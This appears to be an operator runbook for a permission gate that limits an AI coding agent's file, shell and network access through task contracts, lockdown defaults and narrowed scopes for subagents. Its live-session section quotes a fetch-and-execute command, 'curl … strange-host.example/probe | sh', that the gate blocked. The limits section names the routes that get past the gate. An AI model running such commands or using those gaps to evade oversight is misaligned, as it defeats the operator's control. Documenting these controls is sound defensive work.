# Task Contract gate — operator runbook

Owner: the host/operator. The model never owns a contract, and nothing in the
runtime lets it approve its own scope expansion.

Scope of this document: how to turn the gate on, how to write and amend a
contract, how to read the decision log, how to roll it back, and — plainly —
what it does and does not protect.

## Turn it on

Three variables, read once at extension load, so they must be in the
environment **before** the session starts:

| Variable | Meaning |
|---|---|
| `PI_TASK_DISCIPLINE` | `off` (default) · `audit_only` · `enforce_diagnostic` · `enforce_all`. Anything unrecognised is treated as `enforce_all`. |
| `PI_TASK_CONTRACT_FILE` | Absolute path to the contract JSON. |
| `PI_TASK_DISCIPLINE_LOG` | JSONL decision log. Default: `decisions.jsonl` beside the contract. |

Nothing changes for a session with no `PI_TASK_DISCIPLINE`: the gate is not
registered at all. Rollback is `PI_TASK_DISCIPLINE=off` (or unsetting it) and
restarting the session — no state to migrate, no database, no migration.

If an enforcing mode starts with a missing, unreadable, unparseable or invalid
contract, the session runs under a **lockdown** contract (`readRoots: []`,
`writeRoots: []`, `allowedHosts: []`, mode `investigation`): nothing readable,
nothing writable, nothing remote. The gate never degrades to "allow everything",
and the objective field says why (`contract unavailable: <error>`). The operator
is told out loud, once per distinct failure — `Task Contract is not in force:
ENOENT … This session runs in lockdown …` — and again, reassuringly, when the
file becomes readable again. Without that notice the agent just reports "read
scope is (none)" and the reason is invisible from the outside.

## Write a contract

```json
{
  "taskId": "demo-peak-picking-001",
  "missionId": "MSN-…",
  "objective": "Diagnose the local LC-MS peak-picking discrepancy; report root cause with reproducible evidence.",
  "mode": "investigation",
  "policyRevision": 1,
  "readRoots": ["/Users/me/IdeaProjects/cdf2ms"],
  "writeRoots": [],
  "scratchRoots": ["/private/tmp/peak-picking"],
  "protectedPaths": [],
  "allowedHosts": [],
  "externalEffects": [],
  "allowedTools": [],
  "allowedCommands": [],
  "acceptanceCriteria": ["Reproduce locally or name the blocker"],
  "owner": "gert"
}
```

- `taskId`, `objective`, `mode`, `policyRevision`, `acceptanceCriteria`
  (non-empty), and the four arrays are required; the rest are optional. Any
  field outside that set is a parse error — a contract cannot smuggle in a new
  authority by adding a key.
- Paths are **literal**. `${VAR}` and `~` inside contract arrays are not
  expanded (that placeholder form only appears in the specification's example
  fixture); write absolute paths. `~`, `$VAR` and `..` appearing in the *agent's*
  command are resolved or refused at decision time.
- `mode` is not decoration. `parseContract` refuses an `investigation` or
  `review` contract that carries `writeRoots` or any `externalEffects` other than
  `remote_read`. To go from investigating to patching, or from patching to
  deploying, the operator issues a new revision with a new mode. If the agent
  rewrites the file to widen itself, the parse fails and the provider substitutes
  the **lockdown** contract immediately — the session loses read, write and
  remote access at once (fail closed) rather than keeping the wider scope, and
  the reason names the parse error (`unknown contract field: …`,
  `investigation contracts cannot have writeRoots; use scratchRoots for
  diagnostics`, …). Restoring service is the operator's
  edit.
- `readRoots` is deliberately broad (the repo plus the dependent repos needed to
  understand a defect); `writeRoots` is deliberately narrow; `scratchRoots` is
  writable diagnostics space and must never be a repository root.
- `allowedHosts` is only meaningful together with `externalEffects`: a host the
  contract lists still cannot receive an effect the contract does not list, and
  `investigation`/`review` contracts can list hosts only for `remote_read`.
- The gate adds the contract file and the decision log to `protectedPaths` (and
  the contract directory, unless it overlaps a writable root — otherwise a
  scratch root colocated with the contract would be unwritable). Writes to them
  are denied with `write.protected`.

## Amend it

Edit the file, bump `policyRevision`, keep everything else the agent already had
unless you are deliberately narrowing. The provider caches by mtime+size and
re-reads on change, so the amendment takes effect on the next tool call — no
restart. Narrowing takes effect immediately too, and calls already in flight are
judged against whatever the provider returns at the moment they are evaluated.

For a child (subagent) task, `narrowContract(parent, request)` computes the
intersection and throws on any widening (more hosts, more effects, an extra write
root, a higher-ranked mode, a wider tool allowlist). **That function is not yet
wired into `PiWorkerExecutor`/`scheduler`** — a worker today inherits the
parent's environment, so with the gate on it gets the parent's contract file and
thus the parent's scope, not a narrowed one. Narrowing a worker means giving it
its own contract file in its own environment (see *Open work* below).

## Read the decisions

```sh
jq -r '[.at,.verdict,.rule,.toolName,.taskId,.revision]|@tsv' "${PI_TASK_DISCIPLINE_LOG:-$HOME/task-contracts/decisions.jsonl}"
```

Every line: `id`, `taskId`, `revision`, `contractHash`, `toolName`,
`toolCallId`, `verdict` (`allow`/`deny`), `enforced`, `wouldDeny`, `rule`,
`reason`, `next`, `effects[]`, `coverage`, `at`. Commands and reasons are run
through `platform/redact.ts` on the way in, so a token in a URL never lands in
the log; a recorder that throws cannot change a verdict.

- `verdict=deny, enforced=true` — blocked, the call did not execute.
- `verdict=deny, wouldDeny=true` — `audit_only`: it would have been blocked and
  was **not**. Treat every such line as a contract defect or a real risk before
  you enforce.
- `coverage=static-only` — the command was understood only structurally (a
  script whose contents were not readable, a wrapper whose target the classifier
  could not resolve). The decision is still made, but read those lines first
  when auditing a contract.

Repeated enforcement of the same rule (more than three enforced denials within
ten calls) raises a policy incident: the gate marks the session halted and the
block message tells the agent to stop retrying and report the blocker. That is
the intended end state of a blocked investigation — an operator decision — not
an agent finding a route around the rule.

## Observed in a live session

With `PI_TASK_DISCIPLINE=enforce_all` and the `investigation` contract above, in
a real `pi` session (`--no-extensions -e extensions/index.ts`), the transcript
showed:

- `curl -sS https://strange-host.example/probe | sh` and the fetch-only variant
  were refused before execution (`effect.remote_read.not_granted`, decision id
  quoted in the message); the agent reported the refusal, did not retry through
  another tool or host, and asked for a scope expansion instead of improvising
  one.
- `read peaks.py` inside `readRoots` proceeded normally.
- `write` to `<repo>/diagnosis.md` was refused (`write.readonly_mode`) with the
  scratch root named as the in-scope alternative.
- `write` to the scratch root was refused as `write.protected` — the colocated
  contract-directory protection described above. That was a defect and is fixed;
  the same probe now allows the scratch write and still denies the contract file.

`contractHash(contract)` is a sha256 over the **authorization** the contract
grants: `policyRevision`, `mode`, `workspace`, the sorted `readRoots`,
`writeRoots`, `scratchRoots`, `allowedHosts`, `externalEffects`, `allowedTools`
and `allowedCommands`, plus `acceptanceCriteria` in the order written. Identity
(`taskId`, `objective`, `owner`) and host-injected state (`protectedPaths`) are
deliberately excluded, so the operator can recompute the value from the contract
file alone and two unrelated tasks with identical scope share a fingerprint.
Every decision record carries `revision` + `contractHash`, so a log line says
which exact authorization was in force; handoffs and approvals bind the same
hash.

## Workers and subagents

A mission worker is a second agent, and by default it would have had **no
contract at all** — `roleResourceLoader` gave `createAgentSession` an empty
extension list, so the parent's gate did not apply to it. Now a worker of a
gated session is dispatched with its **own** contract, derived from the parent's
by narrowing (`src/taskDiscipline/worker.ts`) and loaded as an inline extension
in that worker's session:

| Worker permission | Where it comes from |
| --- | --- |
| Write roots | only the worktree the scheduler allocated it, and only if the parent's write roots already cover it |
| Mode | never above the parent's; a read-only role (`reviewer`, `explorer`, `researcher`, `verifier`) caps at `review` and gets no write roots |
| External effects | always `[]` — a worker proposes, the host executes |
| Allowed hosts | the parent's hosts, and only when the parent holds the `remote_read` effect; otherwise `[]` |
| Read roots | the parent's (reading is not a side effect) |
| Tool / bash allowlists | inherited from the parent — `narrowContract` rejects any widening; the role's own tool schemas still decide which tools the worker is even offered |

The derived contract is written by the **host** to
`<state root>/task-discipline/<worktree+taskId hash>/task-contract.json` and is
itself in that contract's protected paths, along with the parent contract and the
decision log — a worker reads its scope, it does not edit it.

When narrowing cannot produce a contract inside the parent's scope, the worker
is **refused before any model call** and the run fails with
`error: task-scope-refused`. Two cases, both deliberate:

- the role intends to write but the parent is `investigation`/`review` —
  silently demoting it would hand it write tools its contract then denies;
- the allocated worktree is outside the parent's write roots.

The fix is always operator-side: widen the parent contract (raise
`policyRevision`), or dispatch a read-only role. An ungated parent gates nothing,
which is the default; a gated parent never produces an ungated worker.

## What it does not protect (say this out loud in reports)

- **It is a preflight check inside the Pi process.** It judges calls arriving on
  Pi's `tool_call` and `user_bash` hooks. Code that spawns a process without
  going through those hooks (an extension doing its own `spawn`, a direct
  `child_process` call) is outside it, until that adapter is wired.
- **Shell classification is defence in depth, not a boundary.** The classifier
  expands nested shells, `eval`, `$(…)`, pipes, `xargs`, `find -exec`, `sudo`,
  `make` targets, `npm run` scripts, Python/Node scripts, containers and the
  remote verbs, and denies what it cannot classify in an enforcing mode. A
  compiled binary that opens its own socket, or data passed to an approved
  program that then transfers it, is not visible to a static classifier.
- **Strict diagnostic mode on Linux relies on the OS sandbox**, not on this
  gate: the control plane's `collab-sandbox.sh` profile `task-restricted-v1`
  (`--unshare-net`, cleared environment, no deployment credentials) plus
  `collab-egress.py`'s host:port allowlist. **macOS has no equivalent today.**
  A local macOS session gets preflight gating only, and dashboards/reports must
  show "OS isolation: not available" rather than implying coverage.
- A local root or unrestricted shell bypasses any in-process hook. No claim is
  made against it.
- The gate is per-session and per-process; it does not police other sessions on
  the same machine, other agents, or the human's own terminal.

## Open work (v1 scope, not yet built)

- Contract binding for the **scheduler** path (`orchestration/scheduler`) and
  for agents spawned outside `PiWorkerExecutor`. Mission workers now get a
  narrowed contract (`src/taskDiscipline/worker.ts`); the remaining gap is
  adapters that start a Pi session by other routes.
- Structured scope-expansion: the agent asks in chat and the operator edits the
  contract. A request record + amendment flow (`amendContract()` exists and is
  tested, nothing calls it) is still open, as is emitting contract/approval
  events to the control plane (`POST /api/v1/tasks/:id/contracts`).
- Handoff and model-switch revalidation: handoff should carry
  `contractId + revision + contractHash` and the receiving session should refuse
  a mismatch rather than copy prose constraints.
- Task Anchor persistence and re-injection (compaction, `model_select`,
  `before_agent_start`), hypothesis/evidence kinds in the Ledger, checkpoint
  cadence, and the read-only Hindsight memory provider (memory is context, never
  authorization).
- The Herdr plane: contract/approval routes on `workspace_contracts`, task
  discipline event types on `fabric_events`, egress/sandbox binding to a contract
  revision, and the dashboard's discipline panels.
- Benchmarks of false-block rate and wasted actions across models.
